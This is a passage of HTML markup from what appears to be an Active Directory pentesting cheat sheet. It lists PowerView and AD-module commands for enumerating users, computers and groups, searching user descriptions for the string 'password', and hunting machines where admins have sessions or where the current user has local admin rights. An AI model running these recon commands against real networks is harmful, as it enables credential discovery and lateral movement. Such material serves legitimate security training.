class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">name</span><span class="cm-punctuation">,@{</span><span class="cm-identifier">expression</span><span class="cm-operator">=</span><span class="cm-punctuation">{[</span><span class="cm-identifier">datetime</span><span class="cm-punctuation">]</span><span class="cm-operator">::</span><span class="cm-identifier">fromFileTime</span><span class="cm-punctuation">(</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">pwdlastset</span><span class="cm-punctuation">)}}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-search-for-a-particu">Search for a particular string in attributes</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 738px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 738.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-UserField</span> <span class="cm-operator">-</span><span class="cm-identifier">SearchField</span> <span class="cm-identifier">Description</span> <span class="cm-operator">-</span><span class="cm-identifier">SearchTerm</span> <span class="cm-string">"password"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-string">'Description -like "*password*"'</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">Description</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">name</span><span class="cm-punctuation">,</span><span class="cm-identifier">Description</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-actively-logged-user">Actively logged users on a machine</h4>
<p id="bkmrk-needs-local-admin-ri">Needs local admin rights on the target</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 282.048px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetLoggedon</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-locally-logged-users">Locally logged users on a machine</h4>
<p id="bkmrk-needs-remote-registr">Needs remote registry on the target - started by-default on server OS</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 296.524px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-LoggedonLocal</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-last-logged-user-on-">Last logged user on a machine</h4>
<p id="bkmrk-needs-administrative">Needs administrative rights and remote registry on the target</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 289.286px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-LastLoggedOn</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-user-hunting">User hunting</h3>
<h4 id="bkmrk-find-machine-where-t">Find machine where the user has admin privs</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 224.143px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-LocalAdminAccess</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-if-the-rpc-or-smb-po">If the RPC or SMB ports are blocked, see <code>Find-WMILocalAdminAccess.ps1</code> and <code>Find-PSRemotingLocalAdminAccess.ps1</code> to use WMI or PowerShell Remoting</p>
<h4 id="bkmrk-find-local-admins-on">Find local admins on the domain machines</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 260.333px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-EnumerateLocalAdmin</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-find-machines-where-">Find machines where specific users or groups have sessions</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 332.714px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-UserHunter</span> <span class="cm-comment">#Admins</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-UserHunter</span> <span class="cm-operator">-</span><span class="cm-identifier">GroupName</span> <span class="cm-string">"&lt;group_target&gt;"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 95px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-check-local-admin-ac">Check local admin access for the current user where the targets are found</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 224.143px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-UserHunter</span> <span class="cm-operator">-</span><span class="cm-identifier">CheckAccess</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-computers-enumeratio">Computers enumeration</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 876px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 228px; min-width: 875.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-operator">-</span><span class="cm-identifier">OperatingSystem</span> <span class="cm-string">"*Server 2016*"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-operator">-</span><span class="cm-identifier">FullData</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADComputer</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">Name</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADComputer</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-string">'OperatingSystem -like "*Server 2016*"'</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">OperatingSystem</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">Name</span><span class="cm-punctuation">,</span><span class="cm-identifier">OperatingSystem</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADComputer</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">DNSHostName</span> <span class="cm-operator">|</span> <span class="cm-operator">%</span><span class="cm-punctuation">{</span><span class="cm-identifier">TestConnection</span> <span class="cm-operator">-</span><span class="cm-identifier">Count</span> <span class="cm-number">1</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">DNSHostName</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADComputer</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 228px;"></div><div class="CodeMirror-gutters" style="height: 278px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-groups-enumeration">Groups enumeration</h3>
<h4 id="bkmrk-groups-in-the-curren">Groups in the current domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 267.571px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span 